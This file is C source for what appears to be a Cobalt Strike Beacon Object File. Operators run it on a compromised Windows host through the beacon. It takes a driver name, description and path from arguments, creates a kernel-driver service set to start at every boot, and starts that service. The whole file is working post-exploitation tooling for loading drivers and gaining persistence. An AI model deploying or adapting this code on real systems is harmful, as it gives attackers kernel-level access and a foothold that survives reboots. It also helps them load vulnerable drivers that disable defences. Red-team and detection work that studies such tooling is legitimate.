#include <windows.h>
#include <stdio.h>
#include <tdh.h>
#include <pla.h>
#include <oleauto.h>
#include <tlhelp32.h>
#include <fltuser.h>
#include "loaddriver.h"
#include "beacon.h"

BOOL LoadDriver(LPCWSTR name, LPCWSTR description, LPCWSTR path)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opening service manager\n");
    SC_HANDLE hSCManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to open service manager: %i\n", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating service: %s, %s, %s\n", name, description, path);
    SC_HANDLE hService = ADVAPI32$CreateServiceA(
        hSCManager,
        name,
        description,
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_SYSTEM_START, // start automatically on system start
        SERVICE_ERROR_IGNORE,
        path,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) 
    {
        if (KERNEL32$GetLastError() == 1073)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Service already exists: %i\n", KERNEL32$GetLastError());
            return FALSE;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error creating service: %i\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (!ADVAPI32$StartServiceA(hService, 0, NULL))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error starting service: %i\n", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
    return TRUE;
}

int go(char *args, int len) 
{
	BOOL res = NULL;
	datap parser;
    LPCSTR name = L"";
    LPCSTR description = L"";
    LPCSTR path = L"";

    BeaconDataParse(&parser, args, len);
    name = BeaconDataExtract(&parser, NULL);
    description = BeaconDataExtract(&parser, NULL);
    path = BeaconDataExtract(&parser, NULL);

	res = LoadDriver(name, description, path);
	if(!res) 
    {
		return 1;
	}
	
	return 0;
}


